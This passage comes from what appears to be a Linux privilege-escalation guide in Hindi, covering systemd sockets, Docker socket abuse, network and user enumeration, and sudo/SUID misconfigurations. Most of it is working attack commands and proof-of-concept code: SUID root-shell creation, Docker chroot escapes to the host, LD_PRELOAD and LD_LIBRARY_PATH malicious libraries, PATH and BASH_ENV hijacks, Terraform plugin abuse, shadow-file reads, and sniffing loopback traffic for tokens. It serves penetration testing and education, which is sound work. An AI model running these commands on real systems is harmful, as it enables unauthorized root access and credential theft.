- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग हैं लेकिन सारांश रूप में यह बताने के लिए उपयोग किया जाता है कि यह किस स्थान पर socket को सुनने वाला है (AF_UNIX socket फ़ाइल का पथ, IPv4/6 और/या सुनने के लिए पोर्ट नंबर, आदि)।
- `Accept`: एक boolean आर्ग्युमेंट लेता है। यदि **true**, तो **प्रत्येक इनकमिंग कनेक्शन के लिए एक service instance स्पॉन किया जाता है** और केवल कनेक्शन socket ही उसे पास किया जाता है। यदि **false**, तो सभी listening sockets स्वयं को **start की गई service unit को पास किया जाता है**, और सभी कनेक्शनों के लिए केवल एक service unit स्पॉन किया जाता है। यह मान datagram sockets और FIFOs के लिए नजरअंदाज कर दिया जाता है जहाँ एकल service unit बिना शर्त सभी इनकमिंग ट्रैफ़िक को हैंडल करता है। **Defaults to false**। प्रदर्शन कारणों से, नए daemons को केवल `Accept=no` के अनुकूल तरीके से लिखने की सलाह दी जाती है।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जो कि listening **sockets**/FIFOs के **create** और bind किये जाने से पहले या बाद में क्रमशः **execute** किए जाते हैं। command line का पहला token एक absolute filename होना चाहिए, उसके बाद process के लिए arguments।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो listening **sockets**/FIFOs के **close** और हटाए जाने से पहले या बाद में क्रमशः **execute** किए जाते हैं।
- `Service`: इनकमिंग ट्रैफ़िक पर activate करने के लिए **service** unit का नाम निर्दिष्ट करता है। यह सेटिंग केवल Accept=no वाले sockets के लिए अनुमति है। यह डिफ़ॉल्ट रूप से उस service पर सेट होता है जिसका नाम socket जैसा ही होता है (suffix बदलकर)। अधिकांश मामलों में इस विकल्प का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आप कोई **writable** `.socket` फ़ाइल पाते हैं तो आप `[Socket]` सेक्शन की शुरुआत में कुछ ऐसा जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket बनाए जाने से पहले execute हो जाएगा। इसलिए, आप **संभवतः मशीन के reboot होने तक प्रतीक्षा करनी होगी।**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Socket activation + writable unit path (create missing service)

एक और उच्च प्रभाव वाली misconfiguration यह है:

- एक socket unit जिसमें `Accept=no` और `Service=<name>.service` है
- referenced service unit गायब है
- कोई attacker `/etc/systemd/system` (या किसी अन्य unit search path) में लिख सकता है

ऐसी स्थिति में, attacker `<name>.service` बना सकता है, फिर socket पर ट्रैफ़िक trigger कर सकता है ताकि systemd नई service को load और root के रूप में execute कर दे।

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Writable sockets

यदि आप कोई भी **writable socket** पहचानते हैं (_अब हम Unix Sockets की बात कर रहे हैं और config `.socket` फाइलों की नहीं_), तो **आप उस socket के साथ संचार कर सकते हैं** और शायद किसी vulnerability का exploit कर सकते हैं।

### Unix Sockets को सूचीबद्ध करें
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests हो सकते हैं (_मैं .socket files की बात नहीं कर रहा हूँ बल्कि उन फाइलों की जो unix sockets की तरह काम करती हैं_). आप इसे इस कमांड से चेक कर सकते हैं:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
यदि socket किसी **HTTP** request का जवाब देता है, तो आप इसके साथ **communicate** कर सकते हैं और शायद कुछ **vulnerability** को **exploit** कर सकें।

### Writable Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

यदि आपके पास Docker socket पर write access है, तो आप निम्न commands का उपयोग करके privileges escalate कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड आपको host की फ़ाइल सिस्टम पर root-स्तरीय access के साथ एक container चलाने की अनुमति देते हैं।

#### **Docker API का सीधा उपयोग**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को फिर भी Docker API और `curl` कमांड्स का उपयोग करके हेरफेर किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** एक request भेजें जो host सिस्टम की root directory को mount करने वाला container बनाए।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` का उपयोग करके container से कनेक्शन स्थापित करें, ताकि उसके अंदर कमांड निष्पादित कर सकें।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` कनेक्शन सेट करने के बाद, आप host की filesystem पर root-स्तरीय एक्सेस के साथ सीधे container के अंदर कमांड चला सकते हैं।

### अन्य

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** हैं तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) हैं। यदि [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

जाँचें **more ways to break out from containers or abuse container runtimes to escalate privileges** in:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आप देखते हैं कि आप **`ctr`** कमांड का उपयोग कर सकते हैं तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आप देखते हैं कि आप **`runc`** कमांड का उपयोग कर सकते हैं तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक उन्नत inter-Process Communication (IPC) system है जो applications को प्रभावी ढंग से interact और data साझा करने में सक्षम बनाता है। आधुनिक Linux सिस्टम के लिए डिज़ाइन किया गया यह विभिन्न प्रकार के application communication के लिए एक मजबूत फ्रेमवर्क प्रदान करता है।

यह प्रणाली बहुमुखी है, बुनियादी IPC को समर्थन देती है जो processes के बीच data के आदान-प्रदान को बेहतर बनाती है, और यह enhanced UNIX domain sockets जैसा व्यवहार करती है। इसके अलावा, यह events या signals को broadcast करने में मदद करती है, जिससे system components के बीच seamless integration संभव होता है। उदाहरण के लिए, किसी Bluetooth daemon से आने वाला incoming call का signal एक music player को mute करने के लिए प्रेरित कर सकता है, जिससे उपयोगकर्ता अनुभव बेहतर होता है। साथ ही, D-Bus एक remote object सिस्टम का समर्थन करता है, जो services के अनुरोध और method invocations को सरल बनाता है और पारंपरिक रूप से जटिल प्रक्रियाओं को सरल करता है।

D-Bus एक allow/deny model पर काम करता है, जो matching policy rules के सम्मिलित प्रभाव के आधार पर संदेशों की permissions (method calls, signal emissions, आदि) को प्रबंधित करता है। ये policies bus के साथ इंटरैक्शन्स को निर्दिष्ट करती हैं, और इन permissions के शोषण के माध्यम से privilege escalation हो सकता है।

एक ऐसी policy का उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जो root उपयोगकर्ता को `fi.w1.wpa_supplicant1` से messages का मालिक बनने, भेजने और प्राप्त करने की permissions का विवरण देती है।

यदि किसी policy में किसी निर्दिष्ट user या group का उल्लेख नहीं है तो वह सार्वभौमिक रूप से लागू होती है, जबकि "default" context policies उन सभी पर लागू होती हैं जो अन्य विशिष्ट policies द्वारा कवर नहीं किए गए हैं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहां D-Bus संचार को enumerate और exploit करना सीखें:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करना और मशीन की स्थिति का पता लगाना हमेशा दिलचस्प होता है।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Outbound filtering त्वरित ट्रायाज

यदि host कमांड चला सकता है लेकिन callbacks विफल हो रहे हैं, तो DNS, transport, proxy, और route फ़िल्टरिंग को जल्दी अलग करें:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

हमेशा उन नेटवर्क सेवाओं की जाँच करें जो मशीन पर चल रही हों और जिनके साथ आप इसे एक्सेस करने से पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
listeners को bind target के अनुसार वर्गीकृत करें:

- `0.0.0.0` / `[::]`: सभी स्थानीय इंटरफेस से पहुँच योग्य होते हैं।
- `127.0.0.1` / `::1`: केवल लोकल (good tunnel/forward candidates).
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): आमतौर पर केवल आंतरिक सेगमेंट से ही पहुँच योग्य होते हैं।

### केवल लोकल सर्विस ट्रायेज वर्कफ़्लो

जब आप किसी होस्ट को compromise करते हैं, `127.0.0.1` से bound सेवाएँ अक्सर पहली बार आपकी shell से पहुँच योग्य हो जाती हैं। एक त्वरित लोकल वर्कफ़्लो इस प्रकार है:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS as a network scanner (network-only mode)

स्थानीय PE जांचों के अलावा, linPEAS एक लक्षित नेटवर्क स्कैनर के रूप में चल सकता है। यह `$PATH` में उपलब्ध binaries का उपयोग करता है (आमतौर पर `fping`, `ping`, `nc`, `ncat`) और कोई tooling इंस्टॉल नहीं करता।
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
यदि आप `-t` के बिना `-d`, `-p`, या `-i` पास करते हैं, तो linPEAS एक शुद्ध network scanner के रूप में व्यवहार करता है (privilege-escalation checks के बाकी हिस्सों को स्किप करते हुए)।

### Sniffing

देखें कि क्या आप sniff traffic कर सकते हैं। अगर आप कर सकते हैं, तो आप कुछ credentials प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
त्वरित व्यावहारिक जाँचें:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) post-exploitation में विशेष रूप से उपयोगी होता है क्योंकि कई केवल-आंतरिक सेवाएँ वहाँ tokens/cookies/credentials उजागर करती हैं:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
अभी Capture करें, बाद में parse करें:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Users

### Generic Enumeration

जाँच करें कि आप **who** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन-कौन **login** कर सकते हैं और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

कुछ Linux संस्करण एक बग से प्रभावित थे जो उन उपयोगकर्ताओं को जिनका **UID > INT_MAX** है रूट अधिकार प्राप्त करने की अनुमति देता है। अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**इसे एक्सप्लॉइट करें** के लिए प्रयोग करें: **`systemd-run -t /bin/bash`**

### समूह

जाँचें कि क्या आप किसी ऐसे **समूह के सदस्य** हैं जो आपको रूट अधिकार दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जाँचें कि क्लिपबोर्ड के अंदर कुछ रोचक है या नहीं (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप environment का **कोई भी पासवर्ड जानते हैं** तो उस पासवर्ड का उपयोग करके **प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने की कोशिश करें**।

### Su Brute

यदि आप बहुत शोर करने की परवाह नहीं करते और कंप्यूटर पर `su` और `timeout` बाइनरी मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके उपयोगकर्ता पर brute-force आज़मा सकते हैं.\  
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parameter के साथ भी उपयोगकर्ताओं पर brute-force करने की कोशिश करता है।

## लिखने योग्य PATH का दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप $PATH के किसी फ़ोल्डर के अंदर **लिख सकते हैं** तो आप privileges बढ़ा सकते हैं यदि आप writable फ़ोल्डर के अंदर **उस नाम का एक backdoor बना दें** जो किसी अलग user (आदर्श रूप से root) द्वारा execute किया जाएगा और जिसे $PATH में आपके writable फ़ोल्डर से पहले किसी फ़ोल्डर से **load नहीं किया जाता**।

### SUDO और SUID

हो सकता है कि आपको sudo का उपयोग करके कोई command execute करने की अनुमति हो या उसमें suid bit मौजूद हो। इसे जांचने के लिए उपयोग करें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अप्रत्याशित कमांड आपको फ़ाइलें पढ़ने और/या लिखने या यहाँ तक कि एक कमांड निष्पादित करने की अनुमति देती हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo कॉन्फ़िगरेशन किसी उपयोगकर्ता को बिना पासवर्ड जाने किसी अन्य उपयोगकर्ता की विशेषाधिकारों के साथ कोई कमांड निष्पादित करने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में `demo` उपयोगकर्ता `root` के रूप में `vim` चला सकता है; इसलिए `root` directory में एक ssh key जोड़कर या `sh` कॉल करके शेल पाना अब बहुत आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को कुछ execute करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer पर आधारित**, **PYTHONPATH hijacking** के कारण **कमज़ोर** था, जिससे script को root के रूप में चलाते समय किसी भी मनमाना python लाइब्रेरी को लोड किया जा सकता था:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

यदि sudoers `BASH_ENV` को संरक्षित करता है (उदा., `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash के गैर-इंटरैक्टिव स्टार्टअप व्यवहार का उपयोग करके किसी अनुमत कमांड को चलाते समय root के रूप में मनमाना कोड चला सकते हैं।

- क्यों यह काम करता है: गैर-इंटरैक्टिव शेल के लिए, Bash `$BASH_ENV` का मूल्यांकन करता है और लक्षित स्क्रिप्ट चलाने से पहले उस फ़ाइल को source करता है। कई sudo नियम स्क्रिप्ट या एक shell wrapper चलाने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा संरक्षित है, तो आपकी फ़ाइल root अधिकारों के साथ source की जाती है।

- आवश्यकताएँ:
- एक sudo नियम जिसे आप चला सकें (कोई भी लक्ष्य जो `/bin/bash` को गैर-इंटरैक्टिव रूप से चलाता है, या कोई भी bash script)।
- `BASH_ENV` `env_keep` में मौजूद हो (जाँच करें: `sudo -l`)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Remove `BASH_ENV` (and `ENV`) from `env_keep`, prefer `env_reset`.
- sudo-allowed कमांड्स के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- जब preserved env vars का उपयोग हो तो sudo I/O logging और alerting पर विचार करें।

### Terraform के जरिए sudo के साथ preserved HOME (!env_reset)

यदि sudo environment को अपरिवर्तित छोड़ता है (`!env_reset`) जबकि `terraform apply` की अनुमति देता है, तो `$HOME` कॉल करने वाले उपयोगकर्ता के रूप में रहता है। Terraform therefore loads **$HOME/.terraformrc** as root and honors `provider_installation.dev_overrides`.

- आवश्यक provider को writable डायरेक्टरी पर पॉइंट करें और provider के नाम पर एक malicious plugin डालें (उदा., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform Go plugin handshake असफल कर देगा लेकिन मरने से पहले payload को root के रूप में execute करेगा, और पीछे एक SUID shell छोड़ देगा।

### TF_VAR ओवरराइड्स + symlink validation bypass

Terraform variables को `TF_VAR_<name>` environment variables के जरिए प्रदान किया जा सकता है, जो तब जीवित रहते हैं जब sudo environment को preserve करता है। कमजोर वैलिडेशन जैसे `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` को symlinks से बायपास किया जा सकता है:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform symlink को resolve करके असली `/root/root.txt` को attacker-readable destination में copy कर देता है। इसी तरीके का उपयोग privileged paths में **write** करने के लिए किया जा सकता है, बस destination symlinks पहले से बना कर (उदाहरण के लिए, provider’s destination path को `/etc/cron.d/` के अंदर point करके)।

### requiretty / !requiretty

कुछ पुराने distributions में, sudo को `requiretty` के साथ configure किया जा सकता है, जो sudo को केवल interactive TTY से चलने के लिए मजबूर करता है। अगर `!requiretty` सेट है (या विकल्प मौजूद नहीं है), तो sudo non-interactive contexts जैसे reverse shells, cron jobs, या scripts से execute किया जा सकता है।
```bash
Defaults !requiretty
```
यह अपने आप में सीधे कोई vulnerability नहीं है, लेकिन यह उन स्थितियों का विस्तार करता है जहाँ sudo नियमों का दुरुपयोग बिना full PTY की आवश्यकता के किया जा सकता है।

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

यदि `sudo -l` में `env_keep+=PATH` दिखता है या ऐसा `secure_path` जिसमें attacker-writable entries (उदा., `/home/<user>/bin`) हों, तो sudo-allowed target के अंदर कोई भी relative command shadow किया जा सकता है।

- आवश्यकताएँ: a sudo rule (often `NOPASSWD`) जो एक script/binary चलाती है और absolute paths के बिना commands (`free`, `df`, `ps`, आदि) को कॉल करती है, और एक writable PATH entry जो पहले खोजा जाता हो।
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo निष्पादन को बायपास करने वाले पथ
**Jump** करके अन्य फाइलें पढ़ें या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers file में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** उपयोग किया जाता है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**निवारक उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary बिना command path के

यदि किसी एकल कमांड को **sudo permission** दिया गया है और **path निर्दिष्ट नहीं किया गया** है: _hacker10 ALL= (root) less_ आप PATH variable बदलकर इसका exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी इस्तेमाल की जा सकती है अगर एक **suid** binary **executes another command without specifying the path to it (always check with** _**strings**_ **the content of a weird SUID binary)**।

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

यदि **suid** binary **executes another command specifying the path**, तो आप उस कमांड के नाम का एक फ़ंक्शन **export a function** करके कोशिश कर सकते हैं जिसे suid file कॉल कर रहा है।

उदाहरण के लिए, यदि एक suid binary _**/usr/sbin/service apache2 start**_ को कॉल करता है, तो आपको वह फ़ंक्शन बनाकर और export करके कोशिश करनी चाहिए:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid binary को कॉल करेंगे, यह function execute किया जाएगा

### Writable script जिसे SUID wrapper द्वारा executed किया जाता है

एक सामान्य custom-app misconfiguration यह है कि root-owned SUID binary wrapper एक script को execute करता है, जबकि वह script स्वयं low-priv users के लिए writable रहती है।

आम पैटर्न:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
यदि `/usr/local/bin/backup.sh` writable है, तो आप payload commands जोड़कर SUID wrapper को execute कर सकते हैं:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
त्वरित जाँच:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- loader उन executables के लिए **LD_PRELOAD** को अनदेखा करता है जहाँ real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते।
- suid/sgid वाले executables के लिए, केवल standard paths में मौजूद और वहीँ suid/sgid होने वाली libraries ही preload की जाती हैं।

Privilege escalation तब हो सकती है जब आपके पास `sudo` के साथ commands execute करने की क्षमता हो और `sudo -l` के output में **env_keep+=LD_PRELOAD** शामिल हो। यह configuration **LD_PRELOAD** environment variable को persist और recognize होने की अनुमति देती है, भले ही commands `sudo` के साथ चलाए जा रहे हों, जिससे elevated privileges के साथ arbitrary code execute होने की संभावना बनती है।
```
Defaults        env_keep += LD_PRELOAD
```
इसे **/tmp/pe.c** के रूप में सेव करें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **compile it** का उपयोग करके:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाते हुए
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc का दुरुपयोग किया जा सकता है यदि हमलावर **LD_LIBRARY_PATH** env variable को नियंत्रित करता है, क्योंकि वह उस पथ को नियंत्रित करता है जहाँ लाइब्रेरियाँ खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब आप किसी ऐसे बाइनरी से मिलते हैं जिसके पास **SUID** अनुमतियाँ हैं और जो असामान्य प्रतीत होता है, तो यह जांचना अच्छा अभ्यास है कि वह **.so** फ़ाइलें सही ढंग से लोड कर रहा है या नहीं। इसे निम्नलिखित कमांड चलाकर देखा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
